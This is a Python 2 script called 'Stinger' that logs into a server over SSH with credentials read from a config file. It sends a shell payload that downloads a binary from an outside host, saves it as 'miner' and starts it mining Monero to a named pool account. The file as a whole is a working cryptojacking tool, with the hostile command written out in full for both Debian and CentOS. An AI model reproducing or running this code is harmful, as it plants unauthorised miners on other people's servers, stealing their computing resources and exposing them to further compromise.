#!/usr/bin/python

#! Notes !#

"""
	author = "Doctore"
	fileDate = "10/4/2017"
"""


#! Imports !#
import os
import os.path
import sys
import time
import socket
try:
	import pxssh
except ImportError:
	print("No Module Found! Install PxSSH!")
try:
	import getpass
except ImportError:
	print("No Module Found! Install Getpass!")

#! Declaring PC Username !#
user = getpass.getuser()

os.system("cls")

#! PRINT TERMS !#
try:
	file = open("C:\Users\\"+user+"\Desktop\Python\SSH_Tools\Stinger\README.md", "r")

	for line in file:

		result_readme = os.path.isfile("C:\Users\\"+user+"\Desktop\Python\SSH_Tools\Stinger\README.md")

		if result_readme == True:
			print(line)

except IOError:
	print("README.md Cannot be found. Exiting.")
	sys.exit()

time.sleep(4.5)

terms = raw_input("Do you agree to the Readme? (y/N): ")
if terms == 'y'.upper():
	print("Saving Input")

if terms == 'N'.lower():
	sys.exit("Failed to agree to terms of service.")

#! Checking if Files are Existing !#
os.system('cls')
time.sleep(2)
result = os.path.isfile("C:\Users\\"+user+"\Desktop\Python\SSH_Tools\Stinger\Configuration\config.cfg")
if result == True:
	print("Configuration File... Found")
	time.sleep(2)

if result == False:
	print(+"Checking Configuration File... Missing")

#! Split Username : Password !#
file = open("C:\Users\\"+user+"\Desktop\Python\SSH_Tools\Stinger\Configuration\config.cfg", "r")

for line in file:
	cfgIpv4 	   = line.split(":")[0]
	cfgUsername    = line.split(":")[1]
	cfgPassword   = line.split(":")[2]

print "IPAddress: %s " % (cfgIpv4)
print "Username: %s " % (cfgUsername)
print "Password: %s " % (cfgPassword)

#! Variables !#
hostname = cfgIpv4
username = cfgUsername
password = cfgPassword

time.sleep(3)
os.system('cls')

#! Get Payloadd exec !#
print("""
[1] Ubuntu / Debian
[2] Centos
	""")
OS_Selection = raw_input(">>> ")
if OS_Selection == '1':
	payload = "apt-get update -y; apt-get install screen wget -y; cd ~; mkdir mining; cd mining; mkdir xmr; cd xmr; wget http://netdistrict.pw/mine.x64 -O miner; chmod 777 miner; echo \"screen ./miner -u ciphermode@tuta.io -o stratum+tcp://xmr.pool.minergate.com:45560 -p x -F\" > /root/mining/xmr/start.sh; sh start.sh"
elif OS_Selection == '2':
	payload = "yum update -y; yum install screen wget -y; cd ~; mkdir mining; cd mining; mkdir xmr; cd xmr; wget http://netdistrict.pw/mine.x64 -O miner; chmod 777 miner; echo \"screen ./miner -u ciphermode@tuta.io -o stratum+tcp://xmr.pool.minergate.com:45560 -p x -F\" > /root/mining/xmr/start.sh; sh start.sh"

#! Make Connection !#
try:
	s = pxssh.pxssh()
	s.login(hostname, username, password)
	s.sendline(payload)
	s.prompt()
	print s.before

except pxssh.ExceptionPxssh, e:
	print("Something failed on login! Check your configuration file to match your details!")
	print str(e)
